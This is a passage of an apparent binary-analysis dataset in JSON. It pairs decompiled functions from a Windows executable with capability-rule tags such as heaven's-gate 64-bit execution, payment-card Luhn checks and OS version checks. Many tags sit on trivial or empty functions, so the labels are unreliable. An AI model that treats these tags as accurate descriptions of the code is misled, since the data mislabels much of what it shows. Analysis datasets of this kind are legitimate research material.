iVar1 = 0x1a;\n        break;\n    case 0x1c:\n    case 0x1d:\n        *(param_1 + 4) = 0xb;\n        iVar1 = 0x1c;\n        break;\n    case 0x1e:\n    case 0x1f:\n        *(param_1 + 4) = 0xc;\n        iVar1 = 0x1e;\n        break;\n    case 0x20:\n    case 0x21:\n    case 0x22:\n    case 0x23:\n        *(param_1 + 4) = 0xd;\n        iVar1 = 0x20;\n        break;\n    case 0x24:\n    case 0x25:\n    case 0x26:\n    case 0x27:\n        *(param_1 + 4) = 0xe;\n        iVar1 = 0x24;\n        break;\n    case 0x28:\n    case 0x29:\n    case 0x2a:\n    case 0x2b:\n        *(param_1 + 4) = 0xf;\n        iVar1 = 0x28;\n        break;\n    case 0x2c:\n    case 0x2d:\n    case 0x2e:\n    case 0x2f:\n        *(param_1 + 4) = 0x10;\n        iVar1 = 0x2c;\n        break;\n    case 0x30:\n    case 0x31:\n    case 0x32:\n    case 0x33:\n        *(param_1 + 4) = 0x11;\n        iVar1 = 0x30;\n        break;\n    case 0x34:\n    case 0x35:\n    case 0x36:\n    case 0x37:\n        *(param_1 + 4) = 0x12;\n        iVar1 = 0x34;\n        break;\n    case 0x38:\n    case 0x39:\n    case 0x3a:\n    case 0x3b:\n        *(param_1 + 4) = 0x13;\n        iVar1 = 0x38;\n        break;\n    case 0x3c:\n    case 0x3d:\n    case 0x3e:\n    case 0x3f:\n        *(param_1 + 4) = 0x14;\n        iVar1 = 0x3c;\n        break;\n    case 0x40:\n    case 0x41:\n    case 0x42:\n    case 0x43:\n        *(param_1 + 4) = 0x15;\n        iVar1 = 0x40;\n        break;\n    case 0x44:\n    case 0x45:\n    case 0x46:\n    case 0x47:\n        *(param_1 + 4) = 0x16;\n        iVar1 = 0x44;\n        break;\n    case 0x48:\n    case 0x49:\n    case 0x4a:\n    case 0x4b:\n        *(param_1 + 4) = 0x17;\n        iVar1 = 0x48;\n        break;\n    case 0x4c:\n    case 0x4d:\n    case 0x4e:\n    case 0x4f:\n        *(param_1 + 4) = 0x18;\n        iVar1 = 0x4c;\n        break;\n    case 0x50:\n    case 0x51:\n    case 0x52:\n    case 0x53:\n        *(param_1 + 4) = 0x19;\n        iVar1 = 0x50;\n        break;\n    case 0x54:\n    case 0x55:\n    case 0x56:\n    case 0x57:\n        *(param_1 + 4) = 0x1a;\n        iVar1 = 0x54;\n        break;\n    case 0x58:\n    case 0x59:\n    case 0x5a:\n    case 0x5b:\n        *(param_1 + 4) = 0x1b;\n        iVar1 = 0x58;\n        break;\n    case 0x5c:\n    case 0x5d:\n    case 0x5e:\n    case 0x5f:\n        *(param_1 + 4) = 0x1c;\n        iVar1 = 0x5c;\n        break;\n    case 0x60:\n        *(param_1 + 4) = 0x1d;\n        iVar1 = 0x60;\n        break;\n    case 0x61:\n        *(param_1 + 4) = 0x1e;\n        iVar1 = 0x61;\n        break;\n    case 0x62:\n        *(param_1 + 4) = 0x1f;\n        iVar1 = 0x62;\n        break;\n    case 99:\n        *(param_1 + 4) = 0x20;\n        iVar1 = 99;\n        break;\n    case 100:\n        *(param_1 + 4) = 0x21;\n        iVar1 = 100;\n        break;\n    case 0x65:\n        *(param_1 + 4) = 0x22;\n        iVar1 = 0x65;\n        break;\n    case 0x66:\n        *(param_1 + 4) = 0x23;\n        iVar1 = 0x66;\n        break;\n    case 0x67:\n        *(param_1 + 4) = 0x24;\n        iVar1 = 0x67;\n        break;\n    case 0x68:\n        *(param_1 + 4) = 0x25;\n        iVar1 = 0x68;\n    }\n    *(param_1 + 8) = ((param_2 & 0x7f) - iVar1) + 1;\n    return;\n}\n",
        "token_count": 1829
    },
    "004506e8": {
        "rules": [
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004506e8(uint param_1, int32_t param_2)\n\n{\n    uint *puVar1;\n    uint32_t uVar2;\n    \n    puVar1 = *(param_2 + 8);\n    uVar2 = fcn.0040483c(puVar1[2], puVar1[1], *puVar1);\n    *(param_2 + 0xc) = uVar2 & 0x7f;\n    return;\n}\n",
        "token_count": 108
    },
    "00404a9c": {
        "rules": [
            "64-bit execution via heavens gate/d0eb93f2c5e64800b89b59bc3f7592fa",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00404a9c(void)\n\n{\n    return;\n}\n",
        "token_count": 17
    },
    "00404f60": {
        "rules": [
            "64-bit execution via heavens gate/d0eb93f2c5e64800b89b59bc3f7592fa"
        ],
        "decompiled_code": "\nvoid fcn.00404f60(uint param_1, int32_t param_2)\n\n{\n    uint *in_FS_OFFSET;\n    \n    *in_FS_OFFSET = param_1;\n    (*(param_2 + 5))();\n    return;\n}\n",
        "token_count": 54
    },
    "0041c454": {
        "rules": [
            "64-bit execution via heavens gate/d0eb93f2c5e64800b89b59bc3f7592fa"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0041c454(uint param_1, int32_t param_2)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    uint *in_FS_OFFSET;\n    uint uStack28;\n    uint uStack24;\n    uchar *puStack20;\n    uint var_4h;\n    \n    puStack20 = &stack0xfffffffc;\n    uStack24 = 0x41c4cb;\n    uStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe4;\n    fcn.004070f8();\n    if (param_2 != 0) {\n        iVar2 = fcn.00416484();\n        fcn.004070f8(iVar2 + 5);\n        cVar1 = fcn.0040f8ec();\n        if (cVar1 == '\\0') {\n            fcn.004070f8();\n        }\n    }\n    fcn.00416c1c();\n    *in_FS_OFFSET = uStack28;\n    puStack20 = 0x41c4d2;\n    uStack24 = 0x41c4ca;\n    fcn.004070f8();\n    return;\n}\n",
        "token_count": 262
    },
    "004208f0": {
        "rules": [
            "64-bit execution via heavens gate/d0eb93f2c5e64800b89b59bc3f7592fa",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.004208f0(uint param_1, int32_t param_2)\n\n{\n    int32_t in_EAX;\n    \n    return param_2 - (in_EAX + 5);\n}\n",
        "token_count": 50
    },
    "0045af5c": {
        "rules": [
            "64-bit execution via heavens gate/d0eb93f2c5e64800b89b59bc3f7592fa"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0045af5c(int32_t *arg_8h)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    uint var_8h;\n    uint var_4h;\n    \n    if (*(*(in_EAX + 0x14) + 0x5b) - 1U < 2) {\n        fcn.0045ade4(&stack0xfffffffc);\n        fcn.00431640();\n        cVar1 = fcn.00431748();\n        if (cVar1 == '\\0') {\n            fcn.0045ae78(arg_8h[3] + -2, &stack0xfffffffc);\n            fcn.0045ae78(arg_8h[3] + -2, &stack0xfffffffc);\n        }\n        else {\n            fcn.0045af00(arg_8h[3] + -2, *arg_8h + 10, &stack0xfffffffc);\n        }\n    }\n    else {\n        fcn.0045ade4(&stack0xfffffffc);\n        fcn.00431640();\n        cVar1 = fcn.00431748();\n        if (cVar1 == '\\0') {\n            fcn.0045ae78(arg_8h[1] + 5, &stack0xfffffffc);\n            fcn.0045ae78(arg_8h[1] + 8, &stack0xfffffffc);\n        }\n        else {\n            fcn.0045af00(arg_8h[1] + 10, (arg_8h[2] - *(in_EAX + 0x18)) + -2, &stack0xfffffffc);\n        }\n    }\n    return;\n}\n",
        "token_count": 377
    },
    "00461540": {
        "rules": [
            "64-bit execution via heavens gate/d0eb93f2c5e64800b89b59bc3f7592fa"
        ],
        "decompiled_code": "\nchar * __cdecl fcn.00461540(uint hModule, uint lpProcName)\n\n{\n    uint *puVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    char *pcVar4;\n    uint lpBuffer;\n    char *var_ch;\n    int32_t var_8h;\n    int32_t lpNumberOfBytesRead;\n    \n    var_ch = sub.kernel32.dll_GetProcAddress_1(hModule, lpProcName);\n    if (*var_ch == -0x17) {\n        iVar3 = 5;\n        for (pcVar4 = var_ch + 5; *pcVar4 == -0x70; pcVar4 = pcVar4 + 1) {\n            iVar3 = iVar3 + 1;\n        }\n        sub.kernel32.dll_ReadProcessMemory(*0x498564, var_ch, &lpBuffer, iVar3, &lpNumberOfBytesRead);\n        if (-1 < iVar3 && iVar3 == lpNumberOfBytesRead) {\n            var_ch = fcn.00402ef0();\n            if (0 < iVar3) {\n                var_8h = 1;\n                puVar1 = &lpBuffer;\n                iVar2 = iVar3;\n                do {\n                    var_ch[var_8h + -1] = *puVar1;\n                    var_8h = var_8h + 1;\n                    puVar1 = puVar1 + 1;\n                    iVar2 = iVar2 + -1;\n                } while (iVar2 != 0);\n            }\n            var_ch[iVar3] = -0x17;\n            *(var_ch + iVar3 + 1) = pcVar4 + ((-5 - var_ch) - iVar3);\n        }\n    }\n    return var_ch;\n}\n",
        "token_count": 374
    },
    "004703c4": {
        "rules": [
            "64-bit execution via heavens gate/d0eb93f2c5e64800b89b59bc3f7592fa",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.004703c4(uint param_1, int32_t param_2)\n\n{\n    int32_t in_EAX;\n    \n    return param_2 - (in_EAX + 5);\n}\n",
        "token_count": 50
    },
    "004033d4": {
        "rules": [
            "generate random numbers using the Delphi LCG/d1e3669b265a4cefae2dee380548f202"
        ],
        "decompiled_code": "\nuint fcn.004033d4(void)\n\n{\n    uint32_t in_EAX;\n    \n    *0x490008 = *0x490008 * 0x8088405 + 1;\n    return in_EAX * *0x490008 >> 0x20;\n}\n",
        "token_count": 62
    },
    "004077e0": {
        "rules": [
            "hash data using murmur3/51beaa2d5a2f415db2ae4fc8ef819b72/938ec34b87fc49598ca2362852471498"
        ],
        "decompiled_code": "\nulong fcn.004077e0(void)\n\n{\n    uint in_EAX;\n    \n    return CONCAT44(in_EAX, in_EAX);\n}\n",
        "token_count": 32
    },
    "004096fc": {
        "rules": [
            "hash data using murmur3/51beaa2d5a2f415db2ae4fc8ef819b72/938ec34b87fc49598ca2362852471498"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004096fc(ushort *arg_8h)\n\n{\n    uint32_t in_EAX;\n    ushort *in_ECX;\n    uint32_t in_EDX;\n    \n    *in_ECX = in_EAX / (in_EDX & 0xffff);\n    *arg_8h = in_EAX % (in_EDX & 0xffff);\n    return;\n}\n",
        "token_count": 86
    },
    "00403ce8": {
        "rules": [
            "check OS version/4b1f5bfe83db45b5a81c3c2e0ddf7ce2"
        ],
        "decompiled_code": "\nvoid fcn.00403ce8(void)\n\n{\n    ushort uVar1;\n    int32_t in_EAX;\n    \n    while( true ) {\n        uVar1 = fcn.00403b84();\n        if (uVar1 == '\\n') {\n            return;\n        }\n        if (uVar1 >> 8 == '\\x1a') break;\n        if (uVar1 == '\\r') {\n            uVar1 = fcn.00403b84();\n            if ((uVar1 == '\\n') || (uVar1 >> 8 == '\\x1a')) {\n                return;\n            }\n            *(in_EAX + 0xc) = *(in_EAX + 0xc) + -1;\n        }\n    }\n    return;\n}\n",
        "token_count": 165
    },
    "00405f38": {
        "rules": [
            "check OS version/4b1f5bfe83db45b5a81c3c2e0ddf7ce2"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x00403014)\n\nvoid __fastcall fcn.00405f38(int32_t param_1, char *param_2)\n\n{\n    char cVar1;\n    bool bVar2;\n    uint *in_EAX;\n    int32_t iVar3;\n    \n    if (param_1 == 0) {\n        return;\n    }\n    cVar1 = *param_2;\n    if ((cVar1 != '\\n') && (cVar1 != '\\v')) {\n        if (cVar1 == '\\f') {\n            do {\n                *in_EAX = 0;\n                in_EAX[1] = 0;\n                in_EAX[2] = 0;\n                in_EAX[3] = 0;\n                in_EAX = in_EAX + 4;\n                iVar3 = param_1 + -1;\n                bVar2 = 0 < param_1;\n                param_1 = iVar3;\n            } while (iVar3 != 0 && bVar2);\n            return;\n        }\n        if (cVar1 == '\\r') {\n            do {\n                fcn.00405f38();\n                iVar3 = param_1 + -1;\n                bVar2 = 0 < param_1;\n                param_1 = iVar3;\n            } while (iVar3 != 0 && bVar2);\n            return;\n        }\n        if (cVar1 == '\\x0e') {\n            do {\n                fcn.00405f08();\n                iVar3 = param_1 + -1;\n                bVar2 = 0 < param_1;\n                param_1 = iVar3;\n            } while (iVar3 != 0 && bVar2);\n            return;\n        }\n        if ((cVar1 != '\\x0f') && (cVar1 != '\\x11')) {\n            if (*0x493008 != NULL) {\n                (**0x493008)();\n            }\n            fcn.00402fe8();\n            return;\n        }\n    }\n    do {\n        *in_EAX = 0;\n        in_EAX = in_EAX + 1;\n        iVar3 = param_1 + -1;\n        bVar2 = 0 < param_1;\n        param_1 = iVar3;\n    } while (iVar3 != 0 && bVar2);\n    return;\n}\n",
        "token_count": 511
    },
    "00406128": {
        "rules": [
            "check OS version/4b1f5bfe83db45b5a81c3c2e0ddf7ce2"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x00403014)\n\nvoid __fastcall fcn.00406128(int32_t param_1)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    char *pcVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    uint unaff_ESI;\n    uint unaff_EDI;\n    uint *puVar6;\n    \n    puVar6 = *(param_1 + 1) + 10 + param_1;\n    iVar5 = puVar6[-1];\n    iVar4 = 0;\n    iVar2 = puVar6[-2];\n    do {\n        if (iVar4 < puVar6[1]) {\n            fcn.004030ec();\n        }\n        pcVar3 = **puVar6;\n        cVar1 = *pcVar3;\n        if (cVar1 == '\\n') {\n            fcn.004054c0();\n            iVar4 = 4;\n        }\n        else if (cVar1 == '\\v') {\n            fcn.00405c84();\n            iVar4 = 4;\n        }\n        else if (cVar1 == '\\f') {\n            fcn.00406110();\n            iVar4 = 0x10;\n        }\n        else if (cVar1 == '\\r') {\n            iVar4 = *(pcVar3 + pcVar3[1] + 6);\n            fcn.00406244(iVar4, *(pcVar3 + pcVar3[1] + 2));\n        }\n        else if (cVar1 == '\\x0e') {\n            iVar4 = *(pcVar3 + pcVar3[1] + 2);\n            fcn.00406128();\n        }\n        else if (cVar1 == '\\x0f') {\n            fcn.00407110();\n            iVar4 = 4;\n        }\n        else {\n            if (cVar1 != '\\x11') {\n                if (*0x493008 != NULL) {\n                    (**0x493008)(unaff_EDI, unaff_ESI);\n                }\n                fcn.00402fe8();\n                return;\n            }\n            fcn.00406a5c();\n            iVar4 = 4;\n        }\n        iVar4 = iVar4 + puVar6[1];\n        puVar6 = puVar6 + 2;\n        iVar5 = iVar5 + -1;\n    } while (iVar5 != 0);\n    if (iVar4 < iVar2) {\n        fcn.004030ec();\n    }\n    return;\n}\n",
        "token_count": 553
    },
    "00406244": {
        "rules": [
            "check OS version/4b1f5bfe83db45b5a81c3c2e0ddf7ce2"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x00403014)\n\nvoid __thiscall fcn.00406244(char *param_1, int32_t param_2)\n\n{\n    char cVar1;\n    \n    cVar1 = *param_1;\n    if (cVar1 == '\\n') {\n        do {\n            fcn.004054c0();\n            param_2 = param_2 + -1;\n        } while (param_2 != 0);\n    }\n    else if (cVar1 == '\\v') {\n        do {\n            fcn.00405c84();\n            param_2 = param_2 + -1;\n        } while (param_2 != 0);\n    }\n    else if (cVar1 == '\\f') {\n        do {\n            fcn.00406110();\n            param_2 = param_2 + -1;\n        } while (param_2 != 0);\n    }\n    else if (cVar1 == '\\r') {\n        do {\n            fcn.00406244();\n            param_2 = param_2 + -1;\n        } while (param_2 != 0);\n    }\n    else if (cVar1 == '\\x0e') {\n        do {\n            fcn.00406128();\n            param_2 = param_2 + -1;\n        } while (param_2 != 0);\n    }\n    else if (cVar1 == '\\x0f') {\n        do {\n            fcn.00407110();\n            param_2 = param_2 + -1;\n        } while (param_2 != 0);\n    }\n    else {\n        if (cVar1 != '\\x11') {\n            if (*0x493008 != NULL) {\n                (**0x493008)();\n            }\n            fcn.00402fe8();\n            return;\n        }\n        do {\n            fcn.00406a5c();\n            param_2 = param_2 + -1;\n        } while (param_2 != 0);\n    }\n    return;\n}\n",
        "token_count": 441
    },
    "00463ae0": {
        "rules": [
            "check OS version/4b1f5bfe83db45b5a81c3c2e0ddf7ce2"
        ],
        "decompiled_code": "\nvoid fcn.00463ae0(void)\n\n{\n    int32_t in_EAX;\n    \n    if (in_EAX == 8) {\n        fcn.004054c0();\n        return;\n    }\n    if (in_EAX == 0xd) {\n        fcn.004054c0();\n    }\n    else if (in_EAX == 0x18) {\n        fcn.004054c0();\n    }\n    else if (in_EAX == 10) {\n        fcn.004054c0();\n    }\n    else if (in_EAX == 6) {\n        fcn.004054c0();\n    }\n    else if (in_EAX == 4) {\n        fcn.004054c0();\n    }\n    else {\n        fcn.004054c0();\n    }\n    return;\n}\n",
        "token_count": 181
    },
    "0046bed0": {
        "rules": [
            "check OS version/4b1f5bfe83db45b5a81c3c2e0ddf7ce2"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0046bed0(int32_t param_1, int32_t param_2)\n\n{\n    int16_t *piVar1;\n    uint16_t uVar2;\n    int32_t in_EAX;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint32_t uVar5;\n    uint32_t uVar6;\n    int32_t iVar7;\n    int32_t iStack24;\n    uint32_t uStack20;\n    uint16_t *puStack16;\n    \n    uStack20 = 0xffffffff;\n    uVar2 = *(param_2 + 2);\n    iVar7 = 0;\n    iVar4 = 7;\n    iVar3 = 4;\n    if (uVar2 == 0) {\n        iVar4 = 0x8a;\n        iVar3 = 3;\n    }\n    *(param_2 + 6 + param_1 * 4) = 0xffff;\n    puStack16 = param_2 + 6;\n    iStack24 = 0;\n    uVar5 = uVar2;\n    if (-1 < param_1) {\n        do {\n            iVar7 = iVar7 + 1;\n            uVar6 = *puStack16;\n            if ((iVar4 <= iVar7) || (uVar6 != uVar5)) {\n                if (iVar7 < iVar3) {\n                    piVar1 = in_EAX + 0xa78 + uVar5 * 4;\n                    *piVar1 = *piVar1 + iVar7;\n                }\n                else if (uVar5 == 0) {\n                    if (iVar7 < 0xb) {\n                        *(in_EAX + 0xabc) = *(in_EAX + 0xabc) + 1;\n                    }\n                    else {\n                        *(in_EAX + 0xac0) = *(in_EAX + 0xac0) + 1;\n                    }\n                }\n                else {\n                    if (uVar5 != uStack20) {\n                        piVar1 = in_EAX + 0xa78 + uVar5 * 4;\n                        *piVar1 = *piVar1 + 1;\n                    }\n                    *(in_EAX + 0xab8) = *(in_EAX + 0xab8) + 1;\n                }\n                iVar7 = 0;\n                uStack20 = uVar5;\n                if (uVar6 == 0) {\n                    iVar4 = 0x8a;\n                    iVar3 = 3;\n                }\n                else if (uVar6 == uVar5) {\n                    iVar4 = 6;\n                    iVar3 = 3;\n                }\n                else {\n                    iVar4 = 7;\n                    iVar3 = 4;\n                }\n            }\n            iStack24 = iStack24 + 1;\n            puStack16 = puStack16 + 2;\n            uVar5 = uVar6;\n        } while (iStack24 <= param_1);\n    }\n    return;\n}\n",
        "token_count": 648
    },
    "0046bfdc": {
        "rules": [
            "check OS version/4b1f5bfe83db45b5a81c3c2e0ddf7ce2"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0046bfdc(int32_t param_1, int32_t param_2)\n\n{\n    uint16_t uVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint32_t uVar5;\n    uint32_t uVar6;\n    int32_t iVar7;\n    uint32_t uVar8;\n    int32_t iStack48;\n    uint32_t uStack44;\n    uint16_t *puStack20;\n    \n    iVar7 = 4;\n    iVar2 = 7;\n    uStack44 = 0xffffffff;\n    if (*(param_2 + 2) == 0) {\n        iVar2 = 0x8a;\n        iVar7 = 3;\n    }\n    iStack48 = 0;\n    puStack20 = param_2 + 6;\n    iVar3 = 0;\n    uVar5 = *(param_2 + 2);\n    if (-1 < param_1) {\n        do {\n            iVar4 = iVar3 + 1;\n            uVar6 = *puStack20;\n            if ((iVar2 <= iVar4) || (uVar6 != uVar5)) {\n                if (iVar4 < iVar7) {\n                    do {\n                        uVar8 = *(in_EAX + 0xa7a + uVar5 * 4);\n                        if (0x10 - uVar8 < *(in_EAX + 0x16b8)) {\n                            uVar1 = *(in_EAX + 0xa78 + uVar5 * 4);\n                            *(in_EAX + 0x16b4) = *(in_EAX + 0x16b4) | uVar1 << (*(in_EAX + 0x16b8) & 0x1f);\n                            iVar2 = *(in_EAX + 0x14);\n                            *(in_EAX + 0x14) = *(in_EAX + 0x14) + 1;\n                            *(*(in_EAX + 8) + iVar2) = *(in_EAX + 0x16b4);\n                            iVar2 = *(in_EAX + 0x14);\n                            *(in_EAX + 0x14) = *(in_EAX + 0x14) + 1;\n                            *(*(in_EAX + 8) + iVar2) = *(in_EAX + 0x16b4) >> 8;\n                            *(in_EAX + 0x16b4) = uVar1 >> (0x10U - *(in_EAX + 0x16b8) & 0x1f);\n                            *(in_EAX + 0x16b8) = (uVar8 - 0x10) + *(in_EAX + 0x16b8);\n                        }\n                        else {\n                            *(in_EAX + 0x16b4) =\n                                 *(in_EAX + 0x16b4) | *(in_EAX + 0xa78 + uVar5 * 4) << (*(in_EAX + 0x16b8) & 0x1f);\n                            *(in_EAX + 0x16b8) = *(in_EAX + 0x16b8) + uVar8;\n                        }\n                        iVar4 = iVar4 + -1;\n                    } while (iVar4 != 0);\n                }\n                else if (uVar5 == 0) {\n                    if (iVar4 < 0xb) {\n                        uVar8 = *(in_EAX + 0xabe);\n                        if (0x10 - uVar8 < *(in_EAX + 0x16b8)) {\n                            uVar1 = *(in_EAX + 0xabc);\n                            *(in_EAX + 0x16b4) = *(in_EAX + 0x16b4) | uVar1 << (*(in_EAX + 0x16b8) & 0x1f);\n                            iVar2 = *(in_EAX + 0x14);\n                            *(in_EAX + 0x14) = *(in_EAX + 0x14) + 1;\n                            *(*(in_EAX + 8) + iVar2) = *(in_EAX + 0x16b4);\n                            iVar2 = *(in_EAX + 0x14);\n                            *(in_EAX + 0x14) = *(in_EAX + 0x14) + 1;\n                            *(*(in_EAX + 8) + iVar2) = *(in_EAX + 0x16b4) >> 8;\n                            *(in_EAX + 0x16b4) = uVar1 >> (0x10U - *(in_EAX + 0x16b8) & 0x1f);\n                            *(in_EAX + 0x16b8) = (uVar8 - 0x10) + *(in_EAX + 0x16b8);\n                        }\n                        else {\n                            *(in_EAX + 0x16b4) = *(in_EAX + 0x16b4) | *(in_EAX + 0xabc) << (*(in_EAX + 0x16b8) & 0x1f);\n                            *(in_EAX + 0x16b8) = *(in_EAX + 0x16b8) + uVar8;\n                        }\n                        if (*(in_EAX + 0x16b8) < 0xe) {\n                            *(in_EAX + 0x16b4) = *(in_EAX + 0x16b4) | iVar4 + -3 << (*(in_EAX + 0x16b8) & 0x1f);\n                            *(in_EAX + 0x16b8) = *(in_EAX + 0x16b8) + 3;\n                        }\n                        else {\n                            *(in_EAX + 0x16b4) = *(in_EAX + 0x16b4) | iVar3 - 2U << (*(in_EAX + 0x16b8) & 0x1f);\n                            iVar2 = *(in_EAX + 0x14);\n                            *(in_EAX + 0x14) = *(in_EAX + 0x14) + 1;\n                            *(*(in_EAX + 8) + iVar2) = *(in_EAX + 0x16b4);\n                            iVar2 = *(in_EAX + 0x14);\n                            *(in_EAX + 0x14) = *(in_EAX + 0x14) + 1;\n                            *(*(in_EAX + 8) + iVar2) = *(in_EAX + 0x16b4) >> 8;\n                            *(in_EAX + 0x16b4) = (iVar3 - 2U & 0xffff) >> (0x10U - *(in_EAX + 0x16b8) & 0x1f);\n                            *(in_EAX + 0x16b8) = *(in_EAX + 0x16b8) + -0xd;\n                        }\n                    }\n                    else {\n                        uVar8 = *(in_EAX + 0xac2);\n                        if (0x10 - uVar8 < *(in_EAX + 0x16b8)) {\n                            uVar1 = *(in_EAX + 0xac0);\n                            *(in_EAX + 0x16b4) = *(in_EAX + 0x16b4) | uVar1 << (*(in_EAX + 0x16b8) & 0x1f);\n                            iVar2 = *(in_EAX + 0x14);\n                            *(in_EAX + 0x14) = *(in_EAX + 0x14) + 1;\n                            *(*(in_EAX + 8) + iVar2) = *(in_EAX + 0x16b4);\n                            iVar2 = *(in_EAX + 0x14);\n                            *(in_EAX + 0x14) = *(in_EAX + 0x14) + 1;\n                            *(*(in_EAX + 8) + iVar2) = *(in_EAX + 0x16b4) >> 8;\n                            *(in_EAX + 0x16b4) = uVar1 >> (0x10U - *(in_EAX + 0x16b8) & 0x1f);\n                            *(in_EAX + 0x16b8) = (uVar8 - 0x10) + *(in_EAX + 0x16b8);\n                        }\n                        else {\n                            *(in_EAX + 0x16b4) = *(in_EAX + 0x16b4) | *(in_EAX + 0xac0) << (*(in_EAX + 0x16b8) & 0x1f);\n                            *(in_EAX + 0x16b8) = *(in_EAX + 0x16b8) + uVar8;\n                        }\n                        if (*(in_EAX + 0x16b8) < 10) {\n                            *(in_EAX + 0x16b4) = *(in_EAX + 0x16b4) | iVar4 + -0xb << (*(in_EAX + 0x16b8) & 0x1f);\n                            *(in_EAX + 0x16b8) = *(in_EAX + 0x16b8) + 7;\n                        }\n                        else {\n                            *(in_EAX + 0x16b4) = *(in_EAX + 0x16b4) | iVar3 - 10U << (*(in_EAX + 0x16b8) & 0x1f);\n                            iVar2 = *(in_EAX + 0x14);\n                            *(in_EAX + 0x14) = *(in_EAX + 0x14) + 1;\n                            *(*(in_EAX + 8) + iVar2) = *(in_EAX + 0x16b4);\n                            iVar2 = *(in_EAX + 0x14);\n                            *(in_EAX + 0x14) = *(in_EAX + 0x14) + 1;\n                            *(*(in_EAX + 8) + iVar2) = *(in_EAX + 0x16b4) >> 8;\n                            *(in_EAX + 0x16b4) = (iVar3 - 10U & 0xffff) >> (0x10U - *(in_EAX + 0x16b8) & 0x1f);\n                            *(in_EAX + 0x16b8) = *(in_EAX + 0x16b8) + -9;\n                        }\n                    }\n                }\n                else {\n                    if (uVar5 != uStack44) {\n                        uVar8 = *(in_EAX + 0xa7a + uVar5 * 4);\n                        iVar4 = iVar3;\n                        if (0x10 - uVar8 < *(in_EAX + 0x16b8)) {\n                            uVar1 = *(in_EAX + 0xa78 + uVar5 * 4);\n                            *(in_EAX + 0x16b4) = *(in_EAX + 0x16b4) | uVar1 << (*(in_EAX + 0x16b8) & 0x1f);\n                            iVar2 = *(in_EAX + 0x14);\n                            *(in_EAX + 0x14) = *(in_EAX + 0x14) + 1;\n                            *(*(in_EAX + 8) + iVar2) = *(in_EAX + 0x16b4);\n                            iVar2 = *(in_EAX + 0x14);\n                            *(in_EAX + 0x14) = *(in_EAX + 0x14) + 1;\n                            *(*(in_EAX + 8) + iVar2) = *(in_EAX + 0x16b4) >> 8;\n                            *(in_EAX + 0x16b4) = uVar1 >> (0x10U - *(in_EAX + 0x16b8) & 0x1f);\n                            *(in_EAX + 0x16b8) = (uVar8 - 0x10) + *(in_EAX + 0x16b8);\n                        }\n                        else {\n                            *(in_EAX + 0x16b4) =\n                                 *(in_EAX + 0x16b4) | *(in_EAX + 0xa78 + uVar5 * 4) << (*(in_EAX + 0x16b8) & 0x1f);\n                            *(in_EAX + 0x16b8) = *(in_EAX + 0x16b8) + uVar8;\n                        }\n                    }\n                    uVar8 = *(in_EAX + 0xaba);\n                    if (0x10 - uVar8 < *(in_EAX + 0x16b8)) {\n                        uVar1 = *(in_EAX + 0xab8);\n                        *(in_EAX + 0x16b4) = *(in_EAX + 0x16b4) | uVar1 << (*(in_EAX + 0x16b8) & 0x1f);\n                        iVar2 = *(in_EAX + 0x14);\n                        *(in_EAX + 0x14) = *(in_EAX + 0x14) + 1;\n                        *(*(in_EAX + 8) + iVar2) = *(in_EAX + 0x16b4);\n                        iVar2 = *(in_EAX + 0x14);\n                        *(in_EAX + 0x14) = *(in_EAX + 0x14) + 1;\n                        *(*(in_EAX + 8) + iVar2) = *(in_EAX + 0x16b4) >> 8;\n                        *(in_EAX + 0x16b4) = uVar1 >> (0x10U - *(in_EAX + 0x16b8) & 0x1f);\n                        *(in_EAX + 0x16b8) = (uVar8 - 0x10) + *(in_EAX + 0x16b8);\n                    }\n                    else {\n                        *(in_EAX + 0x16b4) = *(in_EAX + 0x16b4) | *(in_EAX + 0xab8) << (*(in_EAX + 0x16b8) & 0x1f);\n                        *(in_EAX + 0x16b8) = *(in_EAX + 0x16b8) + uVar8;\n                    }\n                    if (*(in_EAX + 0x16b8) < 0xf) {\n                        *(in_EAX + 0x16b4) = *(in_EAX + 0x16b4) | iVar4 + -3 << (*(in_EAX + 0x16b8) & 0x1f);\n                        *(in_EAX + 0x16b8) = *(in_EAX + 0x16b8) + 2;\n                    }\n                    else {\n                        *(in_EAX + 0x16b4) = *(in_EAX + 0x16b4) | iVar4 - 3U << (*(in_EAX + 0x16b8) & 0x1f);\n                        iVar2 = *(in_EAX + 0x14);\n                        *(in_EAX + 0x14) = *(in_EAX + 0x14) + 1;\n                        *(*(in_EAX + 8) + iVar2) = *(in_EAX + 0x16b4);\n                        iVar2 = *(in_EAX + 0x14);\n                        *(in_EAX + 0x14) = *(in_EAX + 0x14) + 1;\n                        *(*(in_EAX + 8) + iVar2) = *(in_EAX + 0x16b4) >> 8;\n                        *(in_EAX + 0x16b4) = (iVar4 - 3U & 0xffff) >> (0x10U - *(in_EAX + 0x16b8) & 0x1f);\n                        *(in_EAX + 0x16b8) = *(in_EAX + 0x16b8) + -0xe;\n                    }\n                }\n                iVar4 = 0;\n                uStack44 = uVar5;\n                if (uVar6 == 0) {\n                    iVar2 = 0x8a;\n                    iVar7 = 3;\n                }\n                else if (uVar6 == uVar5) {\n                    iVar2 = 6;\n                    iVar7 = 3;\n                }\n                else {\n                    iVar2 = 7;\n                    